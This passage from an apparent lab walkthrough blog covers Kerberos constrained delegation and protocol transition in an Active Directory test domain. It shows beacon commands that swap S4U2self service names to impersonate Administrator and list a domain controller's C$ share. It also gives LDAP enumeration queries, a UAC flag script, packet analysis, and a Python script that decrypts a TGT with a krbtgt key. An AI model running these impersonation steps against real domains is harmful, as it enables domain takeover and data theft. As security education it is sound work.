doIFTDCCBUigAwIBBaEDAgEWooIEXDCCBFhhggRUMIIEUKADAgEFoQsbCUxPTC5MT0NBTKIXMBWgAwIBAaEOMAwbBGNpZnMbBGRjMDGjggQhMIIEHaADAgESoQMCAQmiggQPBIIEC0hIzMl5g8jIw8kAMeQyMLuGARjwbdN+17dcv106TSaOxqWIlflL+Z94VR8KUEFrxcurPPfEg2UbX6n1Gz4+vudOHgn/HyChuWJlaZYlMIJUoRsxk6rcNqCKOgoGhPRSahDCiEMvw88VrqR+EOHj7RKFzMLxY13JBoXkjE133nu9ynsH98CisG/a+K9MB+qY9NQifW+uXb3iFyHg0jpjgVNUohmd3I9YtzfLd8RpSDwal8eBVqRjzpIUTHhb/Ao79KvrzpJrIzMNNdRZFKgMuLKhMzKQ1h0LyLaU3O8XF/zwZRLY5SALqZwd1gGRwlpEruERxr5SWHSeGyWhOG2Jrr7duLz6S1irRpjpUQr2pfJ/ma2WFCOId0DN4PnnWIFvMfjAx7sLovqlgl2P4xPJBaVKUWjKELXuAWoxxvZ3zKIjLd/hUhTJZwqxIoIdHoh36gL4yehHoYHVnmrDHSh2kPDWoj4sK+8tQ44vOOMrUYCSb8u9/iLo9QE5ArD9Ird0jlmf5WBrKF/AvaGQoAaB5A1uR3fFIfgum5QAnDeYweuWrNwMLFhapGfbGXQ6PlHDb5+aWvNuxBmrbt+C4KumNvfZSHCAfms5n+8PI34YJae8NJRwFrRqTkbhg7qatwOXUcGROu87MBZgCPPDsBZgWO4R/6QTDHWRhgTicO5FHDUubBKUVeEHhnj8AJgqxRuGmddnYlewzfrMUVcABnIF9KKwc1DoW+tLBQtMx4/UQ/S1z4sbk/vfKwz+xPDhpfewI4/8xDXv4f8qzfANhcjsuQUTJHVfCwTYAE/GbGpck2Knv160jTEV7M4eTKwCl8bnsTHIcXKWBoF9mIRtvxLJgTWGqBoSoMth442aj+os9y1irEsYPy8tsL9MUWCzZ3HAr+cFv3UqOepwmNv3/GkHBpAB0tF72qdX2y20s+iLY6Z7HT0qmYoXEH3bl5Y5m3VE9oOMxyOqLx7NOTd/Mr8lzNguQjrpOahpHndhaE7luY0OoXGchgdBLbAUFfbElceKo6DL7hPXW/sH08RGnaDYKSU5/Om+YpV3UqEXhpGMQdN6edR3AVgls8oa4pmdkmKeIjTlmtxNaNRbxTSqYkayKCJPFeExXgaZACupaEXsN6x8TWbCXeBbLB9l/Xb4iN/kRpHEZsZu0mShSeWCbrwk8EoZ+ZF6rGO+aZB59OZyq6P03WsupkzDLwJbBEC3mkFnJjvBIeT11r3/8v/Jhi/3yM/dDFArpVgsN5fhf9q4rcolmexJkiD7Hv0Lb/qXB3wBcQuon9BM1YmdP2+rF8jhGdMIq5lhExcxL0DPvS0oxpF33Qsj6LU/iIz94lvYhzlFE+qhDyFYIF6/g7efGe9/VAgplZBDXE4IZ2dYAKOB2zCB2KADAgEAooHQBIHNfYHKMIHHoIHEMIHBMIG+oCswKaADAgESoSIEIDcBlO5bANv6TAj1lM9zVLZZGNwF0pFIjIaHCfQBwR9+oQsbCUxPTC5MT0NBTKIaMBigAwIBCqERMA8bDUFkbWluaXN0cmF0b3KjBwMFACClAAClERgPMjAyNjAzMzAxODMxMDNaphEYDzIwMjYwMzMxMDA0MTE0WqcRGA8yMDI2MDMzMTE4MzEwM1qoCxsJTE9MLkxPQ0FMqRcwFaADAgEBoQ4wDBsEY2lmcxsEZGMwMQ==
```

- `/impersonateuser`: The high-privilege identity we want to become (e.g., Administrator).
- `/self`: Tells Rubeus to perform an S4U2self *"loopback"* request to the machine itself.
- `/altservice`: Swaps the SPN to the target service (CIFS).
- `/ticket`: The stolen TGT of the target machine account (DC01$).


if we now look at the description of this ticket we will see that the service is swapped to `cifs/dc01`
```shell
beacon> krb_describe /ticket:doIFTDCCBUigAwIBBaEDAgEWooIEXDCCBFhhggRUMIIEUKADAgEFoQsbCUxPTC5MT0NBTKIXMBWgAwIBAaEOMAwbBGNpZnMbBGRjMDGjggQhMIIEHaADAgESoQMCAQmiggQPBIIEC0hIzMl5g8jIw8kAMeQyMLuGARjwbdN+17dcv106TSaOxqWIlflL+Z94VR8KUEFrxcurPPfEg2UbX6n1Gz4+vudOHgn/HyChuWJlaZYlMIJUoRsxk6rcNqCKOgoGhPRSahDCiEMvw88VrqR+EOHj7RKFzMLxY13JBoXkjE133nu9ynsH98CisG/a+K9MB+qY9NQifW+uXb3iFyHg0jpjgVNUohmd3I9YtzfLd8RpSDwal8eBVqRjzpIUTHhb/Ao79KvrzpJrIzMNNdRZFKgMuLKhMzKQ1h0LyLaU3O8XF/zwZRLY5SALqZwd1gGRwlpEruERxr5SWHSeGyWhOG2Jrr7duLz6S1irRpjpUQr2pfJ/ma2WFCOId0DN4PnnWIFvMfjAx7sLovqlgl2P4xPJBaVKUWjKELXuAWoxxvZ3zKIjLd/hUhTJZwqxIoIdHoh36gL4yehHoYHVnmrDHSh2kPDWoj4sK+8tQ44vOOMrUYCSb8u9/iLo9QE5ArD9Ird0jlmf5WBrKF/AvaGQoAaB5A1uR3fFIfgum5QAnDeYweuWrNwMLFhapGfbGXQ6PlHDb5+aWvNuxBmrbt+C4KumNvfZSHCAfms5n+8PI34YJae8NJRwFrRqTkbhg7qatwOXUcGROu87MBZgCPPDsBZgWO4R/6QTDHWRhgTicO5FHDUubBKUVeEHhnj8AJgqxRuGmddnYlewzfrMUVcABnIF9KKwc1DoW+tLBQtMx4/UQ/S1z4sbk/vfKwz+xPDhpfewI4/8xDXv4f8qzfANhcjsuQUTJHVfCwTYAE/GbGpck2Knv160jTEV7M4eTKwCl8bnsTHIcXKWBoF9mIRtvxLJgTWGqBoSoMth442aj+os9y1irEsYPy8tsL9MUWCzZ3HAr+cFv3UqOepwmNv3/GkHBpAB0tF72qdX2y20s+iLY6Z7HT0qmYoXEH3bl5Y5m3VE9oOMxyOqLx7NOTd/Mr8lzNguQjrpOahpHndhaE7luY0OoXGchgdBLbAUFfbElceKo6DL7hPXW/sH08RGnaDYKSU5/Om+YpV3UqEXhpGMQdN6edR3AVgls8oa4pmdkmKeIjTlmtxNaNRbxTSqYkayKCJPFeExXgaZACupaEXsN6x8TWbCXeBbLB9l/Xb4iN/kRpHEZsZu0mShSeWCbrwk8EoZ+ZF6rGO+aZB59OZyq6P03WsupkzDLwJbBEC3mkFnJjvBIeT11r3/8v/Jhi/3yM/dDFArpVgsN5fhf9q4rcolmexJkiD7Hv0Lb/qXB3wBcQuon9BM1YmdP2+rF8jhGdMIq5lhExcxL0DPvS0oxpF33Qsj6LU/iIz94lvYhzlFE+qhDyFYIF6/g7efGe9/VAgplZBDXE4IZ2dYAKOB2zCB2KADAgEAooHQBIHNfYHKMIHHoIHEMIHBMIG+oCswKaADAgESoSIEIDcBlO5bANv6TAj1lM9zVLZZGNwF0pFIjIaHCfQBwR9+oQsbCUxPTC5MT0NBTKIaMBigAwIBCqERMA8bDUFkbWluaXN0cmF0b3KjBwMFACClAAClERgPMjAyNjAzMzAxODMxMDNaphEYDzIwMjYwMzMxMDA0MTE0WqcRGA8yMDI2MDMzMTE4MzEwM1qoCxsJTE9MLkxPQ0FMqRcwFaADAgEBoQ4wDBsEY2lmcxsEZGMwMQ==
[+] Kerbeus DESCRIBE by RalfHacker
[+] host called home, sent: 24808 bytes
[+] received output:
[*] Action: Describe ticket

  ServiceName              :  cifs/dc01
  ServiceRealm             :  LOL.LOCAL
  UserName                 :  Administrator
  UserRealm                :  LOL.LOCAL
  StartTime (UTC)          :  30.03.2026 18:31:3
  EndTime (UTC)            :  31.03.2026 0:41:14
  RenewTill (UTC)          :  31.03.2026 18:31:3
  Flags                    :  forwarded renewable pre_authent ok_as_delegate enc_pa_rep 
  KeyType                  :  aes256_cts_hmac_sha1
```


We can then use this ticket after injecting it to successfully list the content of the share:

```shell
beacon> dir \\dc01\c$
[+] Running dir (T1135)
[*] Running dir (T1135)
[+] host called home, sent: 5905 bytes
[+] received output:
Contents of \\dc01\c$\*:
	07/10/2025 02:22           <dir> $Recycle.Bin
	06/07/2025 08:21      <junction> Documents and Settings
	02/12/2026 16:43          328704 http.exe
	03/09/2026 23:19         1118208 LAPS.x64.msi
	03/30/2026 01:07      1275068416 pagefile.sys
	09/15/2018 10:19           <dir> PerfLogs
	03/29/2026 14:13           <dir> Program Files
	06/07/2025 21:29           <dir> Program Files (x86)
	03/09/2026 23:56           <dir> ProgramData
	03/10/2026 07:37           <dir> Pwneddddd
	06/07/2025 08:21           <dir> Recovery
	03/28/2026 13:58           <dir> ShareSupport
	02/24/2026 03:33           <dir> System Volume Information
	03/26/2026 16:38           <dir> testshare
	09/04/2025 07:18           <dir> Users
	03/08/2026 08:06           <dir> Windows
	                      1276515328 Total File Size for 3 File(s)
	                                                     13 Dir(s)
```

Bonus tip:


if we want to know before swaping SPNs what is the ticket look like we can manually ask for s4u2self and get this TGS:
```shell
beacon> krb_s4u /service:cifs/dc01 /impersonateuser:administrator /ticket:doIE2jCCBNagAwIBBaEDAgEWooID6zCCA+dhggPjMIID36ADAgEFoQsbCUxPTC5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJTE9MLkxPQ0FMo4IDqTCCA6WgAwIBEqEDAgECooIDlwSCA5OeWKoY647o7rF+DR+j/hYPyHlpdb5B5XDr8ucoF1f/CsZXKCjnWnEkBkRgZUqDtkgw7XOid2/UaJ4l4hyUqVjXA0Wvo2ICSr4jve/YXeWMPvvOCCGQzHdGmCQEcasWmbAuWFcMvgUtC/xpdMEEl7LYgO1DMdRxnfd7bxMC3ro+O1zfXQVM5O8FoCJkSvieWTwbxbxyvHX2HyF19GD+k1fXAZrL4y9P8MDt6+OzMxFMN43KDVgYHMj7TL3LoxqHXKKRJDb7ZlrXBK9DkCYQld68tNBHeo3guxsKFNcw50zWoE+ezwj8dDFjIAfWbeFri0xbFeYs7icW/kR4RfW4VKjQmOIVqbdctEOY/VuoB5BtCm/2KoJfn67xgAiPPum93ZC9tXH2B50kWMf/eblyG9iwFIwrW7Oh6fsEqnDzoAkF/xbuDUnMjUirTMoNlgsMfVAHBhFJlAB5jbkRAExdctys2r9X/e4QJHpH/ri0rg0bcJ1HJ3qgOojo+9k7DH0U6ph8Xkf8tynth67/Cp+06Gk6Omkdw3BUcHqfyrNqGvhEDbToFW0rxjNl5+jbFNdqjDJgxWzbMpnNngbn354gMg7TZLZp2sWPypANkhcxAkiH44VuoonBPWmBZ2/8wSzvdyWvG3SL/wBAWqtezfK+bwsDmcfRLOYlhRJhsiozULiV2rfmbh/ZBhX1GQejvvtlvGuRWMZldekS41WOT1LuvK4CZlPeyJynJQsekEkp6K2zpkcIskTzXNRdapt+StPVKu1SxpNghBE43BNPt+0DoAN2FEFf1cYb8w5KFsLHww7OjZvSkmN9ewXHBAv1hI4NH+j1BoXvIk6pCtjroYjFqFX8/pDKXYhQOvXPlJY2pjwWdBoDy4K91vo0vBTB0aiUsO5fkmEv3E942s5HhivPWYpKMsA20S/vxzzmNCiC7IlpI7SiRdLstGhX0DBoGA2CNVO92fY2IYgoOhjwm8lCc5CSAnq8rYX8FZhvj8cCOWqS9PYH6zccDX6nGfAwKR7EdyXjH7NX1DSgEMnf5YKECvbkevyMklwXa2i7dYYgasglGTHpEYDMGAl9Aty1fIZbQXLPbXkjx4FpunGl/EvMFWfDyFJK2XWg3kl4kGJXSedpkbJhMZdkFHKtVuudKqJPc4Xq/WQdi9XIEL9M+Y3hrTUplQELTeVHZ4LhaAuWbvEyviybZyhAS6QEitYK9mh4Ea1VjuKjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaArMCmgAwIBEqEiBCA/4Frv8Hwk/Uq2Oa7Pa57BQ8gePSBkn0UW1r3344jxM6ELGwlMT0wuTE9DQUyiEjAQoAMCAQGhCTAHGwVXUzAxJKMHAwUAQOEAAKURGA8yMDI2MDMzMDE2MDAyOVqmERgPMjAyNjAzMzEwMjAwMjlapxEYDzIwMjYwNDA2MTYwMDI5WqgLGwlMT0wuTE9DQUypHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCUxPTC5MT0NBTA==
[+] Kerbeus S4U by RalfHacker
[+] host called home, sent: 69072 bytes
[+] received output:
[*] Action: S4U

[*] Building S4U2self request for: 'WS01$@LOL.LOCAL'
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'WS01$@LOL.LOCAL'
[*] base64(ticket.kirbi):

doIFQjCCBT6gAwIBBaEDAgEWooIEVzCCBFNhggRPMIIES6ADAgEFoQsbCUxPTC5MT0NBTKISMBCgAwIBAaEJMAcbBVdTMDEko4IEITCCBB2gAwIBEqEDAgEFooIEDwSCBAuP0bZSLTvxT3Gqye5LFT+l0pqpNAIzL6dt0GimfbetWRsg2jaPePK/DhWqqdQ5bMSt7eYYVXlb/uSKpSScaHuL6Wc4kGKj82CLfMFG2/8UduEK08yWViVwRUQtYzFvBlaaDZ2fPrN/rsKVhRIExtjc4Na+AisTz+396d0fOhoHRnAvsPWyfwBDT9NzYvswmkWtwNXlTMOrsHnpunUYut4cf5I0fRVtpNJ/16VaoqyHaWHx0tYsiCRXi0p46l/ePMA7FzPGOOVIWUjdHl+MZV5FwvcQC8hK/m/mrE1TK+Psbs0R5vNf/vO1Sj1iPRyRNYecTvo7YFWjgl6OVOpDDknuGqUY44oE92UH5pvy0PxK08DCckdPw4AS1OnUvuOoVaDzJHC0Jv/t0J4NsM2c+xoBBOk4gtq1frcO0YyBspJpjWbl9g7Rf4nqw8bD1QXsh92/tRYWMt7uH31SwzXv75clpS6qS4k4qqSMy6d28E3RCyLksTdB5Mx0Zix2aGHS1lNMvztlRPiJEEf/0L7jpRrtp6dWd8jBTgp2VrvVyVssaB/Qn0tvvFs0lvgwICHKx9bY77EX7AKQtpVN3McwPIySKwaai4ynRHYFhJJeiJaYATJbkXWJUU8S8xzOG/3g4EKkTYGEg0Tjqgbae2kvpbBLZ6Vru9gMODo3UHItRM8gCr2/c6/BxEQTqUnG1PcHJvNYZHGfb/dHLWe0a1imR1oJUpunQzhcKOAZt2xHujjBvsNuPNrp2Uc5EmxfSs6Ep1fWjl+T3G+DxL8NxrztDdZWXPkrgpTBeoxdfB8LNSHCYmybpmvfwQHhNFDUJAt5BtEJOMJq8J/ig3k2QyhHDK0A6lzK94aTsIiM3AEP3w+UzejEF+NCJmdVaTc1XthL3fuwB3KX8TNS40LkGZE+Cd0n9mIIi+xl1EKJF98tpM8Egg8REC6Bh7srae7qyN7+qSe2bpGBRFD81rRMM5RgmHEq5+rGIg+B5LhW253VnDyAqBR9u5aXpeuj9T4YV68GtlWPSSSpGLTEI6uVuGl218CT2l1H+dTInIIXTcLm4Bz4Xu+NpDGRh9/G6XbI7pamSWYQKW2QGP5UAiJgFEcsUxxTXENwhBn8Gl/u1ROJLxtYe4eI5/1CaFlzvYWlbmZN5YznfNGe8sNahF18wH6cr5g/599R371Ysy2s+MT9My55c5tsgThOvf2nXoHaCzW5HjA/CS2Ya+2E5ew42biBVo9nMxP3oWRhy97Hll+Pt2xG9z79tCaS9/+KjXyJR2dwlIJRPyg/YbQGOf1bmy9Uq1Ik5WYLpp3M7w+BRhFclP1VLgVZJHOVk+eVjYb2ebfmidDHN6fyUlg+CSgAh8ylDUs+jFsH7hdWcwBG6ESjgdYwgdOgAwIBAKKBywSByH2BxTCBwqCBvzCBvDCBuaArMCmgAwIBEqEiBCA7SGLFHz7o9LwKGwksN76GQMmHN3zs36Ege8K70PjRCaELGwlMT0wuTE9DQUyiGjAYoAMCAQqhETAPGw1hZG1pbmlzdHJhdG9yowcDBQAApQAApREYDzIwMjYwMzMwMjAwMDI0WqYRGA8yMDI2MDMzMTAyMDAyOVqnERgPMjAyNjAzMzEyMDAwMjRaqAsbCUxPTC5MT0NBTKkSMBCgAwIBAaEJMAcbBVdTMDEk

[*] Impersonating user 'administrator' to target SPN 'cifs/dc01'
[*] Building S4U2proxy request for service: 'cifs/dc01'

	[x] Kerberos error : 13
```

Then we can see how it looks, it will have the machine name `DC01$` in the ServiceName and the UserName is `administrator`:

```shell
beacon> krb_describe /ticket:doIFQjCCBT6gAwIBBaEDAgEWooIEVzCCBFNhggRPMIIES6ADAgEFoQsbCUxPTC5MT0NBTKISMBCgAwIBAaEJMAcbBVdTMDEko4IEITCCBB2gAwIBEqEDAgEFooIEDwSCBAuP0bZSLTvxT3Gqye5LFT+l0pqpNAIzL6dt0GimfbetWRsg2jaPePK/DhWqqdQ5bMSt7eYYVXlb/uSKpSScaHuL6Wc4kGKj82CLfMFG2/8UduEK08yWViVwRUQtYzFvBlaaDZ2fPrN/rsKVhRIExtjc4Na+AisTz+396d0fOhoHRnAvsPWyfwBDT9NzYvswmkWtwNXlTMOrsHnpunUYut4cf5I0fRVtpNJ/16VaoqyHaWHx0tYsiCRXi0p46l/ePMA7FzPGOOVIWUjdHl+MZV5FwvcQC8hK/m/mrE1TK+Psbs0R5vNf/vO1Sj1iPRyRNYecTvo7YFWjgl6OVOpDDknuGqUY44oE92UH5pvy0PxK08DCckdPw4AS1OnUvuOoVaDzJHC0Jv/t0J4NsM2c+xoBBOk4gtq1frcO0YyBspJpjWbl9g7Rf4nqw8bD1QXsh92/tRYWMt7uH31SwzXv75clpS6qS4k4qqSMy6d28E3RCyLksTdB5Mx0Zix2aGHS1lNMvztlRPiJEEf/0L7jpRrtp6dWd8jBTgp2VrvVyVssaB/Qn0tvvFs0lvgwICHKx9bY77EX7AKQtpVN3McwPIySKwaai4ynRHYFhJJeiJaYATJbkXWJUU8S8xzOG/3g4EKkTYGEg0Tjqgbae2kvpbBLZ6Vru9gMODo3UHItRM8gCr2/c6/BxEQTqUnG1PcHJvNYZHGfb/dHLWe0a1imR1oJUpunQzhcKOAZt2xHujjBvsNuPNrp2Uc5EmxfSs6Ep1fWjl+T3G+DxL8NxrztDdZWXPkrgpTBeoxdfB8LNSHCYmybpmvfwQHhNFDUJAt5BtEJOMJq8J/ig3k2QyhHDK0A6lzK94aTsIiM3AEP3w+UzejEF+NCJmdVaTc1XthL3fuwB3KX8TNS40LkGZE+Cd0n9mIIi+xl1EKJF98tpM8Egg8REC6Bh7srae7qyN7+qSe2bpGBRFD81rRMM5RgmHEq5+rGIg+B5LhW253VnDyAqBR9u5aXpeuj9T4YV68GtlWPSSSpGLTEI6uVuGl218CT2l1H+dTInIIXTcLm4Bz4Xu+NpDGRh9/G6XbI7pamSWYQKW2QGP5UAiJgFEcsUxxTXENwhBn8Gl/u1ROJLxtYe4eI5/1CaFlzvYWlbmZN5YznfNGe8sNahF18wH6cr5g/599R371Ysy2s+MT9My55c5tsgThOvf2nXoHaCzW5HjA/CS2Ya+2E5ew42biBVo9nMxP3oWRhy97Hll+Pt2xG9z79tCaS9/+KjXyJR2dwlIJRPyg/YbQGOf1bmy9Uq1Ik5WYLpp3M7w+BRhFclP1VLgVZJHOVk+eVjYb2ebfmidDHN6fyUlg+CSgAh8ylDUs+jFsH7hdWcwBG6ESjgdYwgdOgAwIBAKKBywSByH2BxTCBwqCBvzCBvDCBuaArMCmgAwIBEqEiBCA7SGLFHz7o9LwKGwksN76GQMmHN3zs36Ege8K70PjRCaELGwlMT0wuTE9DQUyiGjAYoAMCAQqhETAPGw1hZG1pbmlzdHJhdG9yowcDBQAApQAApREYDzIwMjYwMzMwMjAwMDI0WqYRGA8yMDI2MDMzMTAyMDAyOVqnERgPMjAyNjAzMzEyMDAwMjRaqAsbCUxPTC5MT0NBTKkSMBCgAwIBAaEJMAcbBVdTMDEk
[+] Kerbeus DESCRIBE by RalfHacker
[+] host called home, sent: 24792 bytes
[+] received output:
[*] Action: Describe ticket

  ServiceName              :  WS01$
  ServiceRealm             :  LOL.LOCAL
  UserName                 :  administrator
  UserRealm                :  LOL.LOCAL
  StartTime (UTC)          :  30.03.2026 20:0:24
  EndTime (UTC)            :  31.03.2026 2:0:29
  RenewTill (UTC)          :  31.03.2026 20:0:24
  Flags                    :  renewable pre_authent ok_as_delegate enc_pa_rep 
  KeyType                  :  aes256_cts_hmac_sha1
```

What Rubeus did was changing the `WS01$` from service name and put `cifs/dc01`

---


## Constrained Delegation

Constrained delegation — or Service for User (S4U) Kerberos extension — was introduced as a more secure improvement over traditional delegation. it has two new protocols:
1. **S4U2proxy (Service for User to Proxy):** This is the part that actually does the delegation. It lets a service take a user’s identity and request a service ticket to another service on their behalf
2. **S4U2Self (Service for User to Self):** This is more like a setup step. It allows a service to generate a service ticket for a user to itself, even if the user didn’t originally authenticate using Kerberos (NTLM for example). Once the service has that ticket, it can then move to S4U2Proxy and request access to other services as that user. This is refered as *protocol transition.*

I like to think of it as unconstrained delegation but with guardrails, instead of a (any) user being able to delegate to (any) service, they’re only allowed to delegate to specific services on specific hosts. 


So instead of relying on the `TRUSTED_FOR_DELEGATION` flag like in unconstrained case, constrained delegation is controlled through the `msDS-AllowedToDelegateTo` attribute on the computer account which is a list of `SPNs` that this machine is allowed to act against on behalf of a user.
```shell
beacon> ldapsearch (&(objectclass=computer)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
[*] Filter: Filter: (&(objectclass=computer)(msDS-AllowedToDelegateTo=*))
[*] Scope of search value: 3
[*] Returning specific attribute(s): samAccountName,msDS-AllowedToDelegateTo

--------------------
sAMAccountName: SRV02$
msDS-AllowedToDelegateTo: cifs/DC01, cifs/DC01.lol.local
retrieved 1 results total
```
as we can see `SRV02$` is allowed to delegate specifically for `cifs` service on `DC01` host.

Now let's discuss `S4U2self` and `S4U2proxy` in details

---

## S4U2self (Protocol Transition)


One way to actually know if server is configured with Protocol Transition we need to see `TRUSTED_TO_AUTH_FOR_DELEGATION` flag is enabled or not (it is not by default), this can be done by enumerating   `UserAccountControl` attribute of the computer object.

```shell
beacon> ldapsearch (&(objectclass=computer)(samaccountname=SRV02$)) --attributes userAccountControl

userAccountControl: 16781312
retrieved 1 results total
```

then we can iterate over some popular flags and performing `Bitwise AND` operation to break that number into human-readable flags, I wrote a small script that helps us do that (other flags are [here](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties)):
```powershell
$UAC_FLAGS = @{
    0x0001 = "SCRIPT"
    0x0002 = "ACCOUNTDISABLE"
    0x0008 = "HOMEDIR_REQUIRED"
    0x0010 = "LOCKOUT"
    0x0020 = "PASSWD_NOTREQD"
    0x0040 = "PASSWD_CANT_CHANGE"
    0x0080 = "ENCRYPTED_TEXT_PWD_ALLOWED"
    0x0100 = "TEMP_DUPLICATE_ACCOUNT"
    0x0200 = "NORMAL_ACCOUNT"
    0x0800 = "INTERDOMAIN_TRUST_ACCOUNT"
    0x1000 = "WORKSTATION_TRUST_ACCOUNT"
    0x2000 = "SERVER_TRUST_ACCOUNT"
    0x10000 = "DONT_EXPIRE_PASSWORD"
    0x20000 = "MNS_LOGON_ACCOUNT"
    0x40000 = "SMARTCARD_REQUIRED"
    0x80000 = "TRUSTED_FOR_DELEGATION"
    0x100000 = "NOT_DELEGATED"
    0x200000 = "USE_DES_KEY_ONLY"
    0x400000 = "DONT_REQUIRE_PREAUTH"
    0x800000 = "PASSWORD_EXPIRED"
    0x1000000 = "TRUSTED_TO_AUTH_FOR_DELEGATION"
}

$UAC_FLAGS.GetEnumerator() | Where-Object {
    $uac -band $_.Key
} | Select-Object Value
```
so after setting `$uac` to `16781312` and run the script we got this:
```shell
Value
-----
TRUSTED_TO_AUTH_FOR_DELEGATION
WORKSTATION_TRUST_ACCOUNT
```
This is how we enumerate this flag.

---

Now lets dive into network analysis!

We configure the IIS to handle only NTLM authentication
![image](/assets/img/Delegation/ntlm.png)


and ofc its configured to auth with any protcol
![image](/assets/img/Delegation/any.png)


On accessing the web app from `WS01` it asks for credentials.
![image](/assets/img/Delegation/webapp.png)

After logging in with help of claude it wrote a simple `asp` file that display the authenticated user, Auth type and lists the content of the `\\DC01\ShareSupport` that `SRV02` can delegate to with `cifs` service.
![image](/assets/img/Delegation/loginntlm.png)

If we see what wireshark caught it will be something like this:
![image](/assets/img/Delegation/cap_ntlm.png)

Overview on each one:
1. Normal NTLM authentication flow that is already well documented here[^ntlm] by the same author.
2. This is where the web server is requesting a S4U2Self ticket on behalf of `LOL\pixel` to itself.
3. This is the S4U2Proxy part where the web server says to the Domain Controller Here is the S4U2self Evidence Ticket proving that LOL\pixel authenticated to me.
4. This is where the web server takes that final Service Ticket and actually connects to the backend file share over SMB.

Let's dive deeper!

### s4u2self TGS-REQ

![image](/assets/img/Delegation/1.png)

we will focus on:
1. `req-body`: which basically tell the KDC What ticket do I want you to issue.
2. `padata`: the 3 padata items has the proper info that make the KDC trust this request.

#### req-body

![image](/assets/img/Delegation/2.png)
here it we can it has Key fields inside of it like sname realm, kdc-options.

what is intersting is the `sname` because it has the `srv02$` machine account to which means that it is requesting a ticket to itself
> Even I DID configure `svc_iis` to handle all thing it still fallback to the account machine `srv02`, I don't know why I even turned off Kernel-Mode Authentication. I will troubleshoot it later but for now it is requesting ticket to self as `SRV02$` account not `svc_iis`
{: .prompt-warning }

#### PA-TGS-REQ
![image](/assets/img/Delegation/3.png)

it contains two important parts, `SRV02$`TGT and Authenticator.

the use of this part is just to prove to the KDC that is a valid packet by providing to the KDC the TGT along with the authenticator that is encrypted using the Session Key that was generated when the machine first got it's TGT.

for fun we can use script from the same [blog](https://blog.redforce.io/windows-authentication-attacks-part-2-kerberos/) and use the krbtgt to decrypt the tgt then getting the session key to decrypt the authenticator:

```python
from pyasn1.codec.der import decoder, encoder
from binascii import unhexlify, hexlify
from impacket.krb5.crypto import Key, _enctype_table, InvalidChecksum
cipher = _enctype_table[18]()

# krbtgt aes-256 hash
key = Key(18, unhexlify("c6d08e93289dc233a35193e68b786cf0e4f1b5c1c78d1e1ea6f933ce5dc73c83"))

# the TGT of SRV02$ account
mycipher = "d52a84f29a812303bf168379ef55c74d7995be8c107a823b3d65993719ce222df6a917e36a36fbbc455427a6bf65906cc651bf2960becb40c2fec7bb9b589fd198505905e5f7415a8a08b9fae2e14377beaafa2777fb148adafde819e40d94b991f5dc016476c6b43d2641645f890cd3e7a52831a6df76fe5a6f8aee461937508975602b11c874c0d7e2ac8d7d3354832a9aa5635126a0ccfda189e07c27d70a02e5d584cf248929439327843cf6090d9536cfe7e727967793cd4a4845373e0f27cf1de6699834162fd4131838dc0eaf8c8cf605b6b7a99ea1b8f409298b2d5b8fdd194abb6b6c4c2acdd2f30f9168ce26990c6c19d4f8c10ce935dab0097b4549c90b4168d5486e461edb4e52543e765dcc49efa8f08e7473f0bcaaa74bf46398901e6ac822c7e78966901ab182f8688680cf9af58e3196d9f25ba7d2f5841ae908f0e1d142ce9499edce84f13cae24a1f48ee3cb8d476dec3b0ed0a04e01646d47a2d1e203a1098082f2f36e8b24b4db38fe191255267e47052e1d5a67441696b9ea8f9cf34fe1354b6350eeb735c5d6c10c667cbebea7bcfbe120b7ea31e8fe2a064cce0a49ba874f2023ac652e0b91a6e08b2c4587f1bd2f16c35159ec8c8d0b280f62919bf7885cc1b4bee9aff661b98a9331fe9050265ae037b51163af7bfdfc2cb1e703a37c1f8945b7255facedd457f1594c2ecab45993e3dc799967d59fa71eec392cdcff01d87c2f50f2fe262ce022ff249a37f1fda545331f09c80ec263a1b265aa4533e4fd5af9697c26f3921ba137cb53d44220da348b4b968f51b2b5e6e39ebe105549390051a6098343dcacbbfd206e591372e27a206180dcbd30532211d7458f17eaa7e574b34763d3b7aa250f91c72d79025ce7821b60e9d12d85f19b4c53232c887b4ca85a1f03325be8faf2c6fe079e8c4f9fa1b1d2ea67adb2a6f916f0d39b77df77d02122661556213355247b10a8ead58320f1a590f997b4f2be5840bb4f0ff8d6906e0683ae4a17f814258b532dfafa580640a805cd25462bfb990ae4272e628d5535eda21629dc1bc3754ae78f29039efb4b852b7a06ba9cec826ea06f93af5fcf8fdfe35c2c593c83562c21043a3350703a7b26647bf3ae8a6376722613f1ad19f7d0c17e17839cc51926fa349bb16f6de8ebcc129c6d081d5c9f8439cb0f3bdfd9234e229c4b3301ec0b62f6030a1f0f7e10d2cd253281ff266f5cdee68a463fa299778d95e97cb7a1f594170f5f5bb34889a78f9d9d21799e587329ccc7f0"

jnk = cipher.decrypt(key, 2, unhexlify(mycipher))
dec = decoder.decode(jnk)
for i in dec:
  print (i)
```


we will get this decoded TGT:
```shell
Sequence:
 field-0=1088487424
 field-1=Sequence:
  field-0=18
  field-1=0x9fbfb519eb4f8a50c2f65194c1d20fa574f46b9d979a4c4aee95d1054c9e4b41

 field-2=LOL.LOCAL
 field-3=Sequence:
  field-0=1
  field-1=SequenceOf:
   SRV02$

 field-4=Sequence:
  field-0=0
  field-1=

 field-5=20260328094157Z
 field-6=20260328094157Z
 field-7=20260328194157Z
 field-8=20260404094157Z
 field-9=SequenceOf:
  Sequence:
   field-0=1
   field-1=0x3082029a30820296a00402020080a182028c04820288050000000000000001000000b001000058000000000000000a0000001600000008020000000000000c000000480000002002000000000000060000001000000068020000000000000700000010000000780200000000000001100800cccccccca0010000000000000000020014f5e31d97bedc01ffffffffffffff7fffffffffffffff7fbe80245d62bcdc01be408e872bbddc01ffffffffffffff7f0c000c00040002000000000008000200000000000c000200000000001000020000000000140002000000000018000200730000004906000003020000010000001c000200200000000000000000000000000000000000000008000a002000020006000800240002002800020000000000000000008000040000000000000000000000000000000000000000000000000000000000010000002c00020000000000000000000000000006000000000000000600000053005200560030003200240000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000030200000700000005000000000000000400000044004300300031000400000000000000030000004c004f004c00000004000000010400000000000515000000cd77e25c5ee8c9fdc0d1ce6d010000003000020007000000010000000101000000000012010000000000000080e02e1e97bedc010c00530052005600300032002400000020001000120030000100000000000000530052005600300032002400400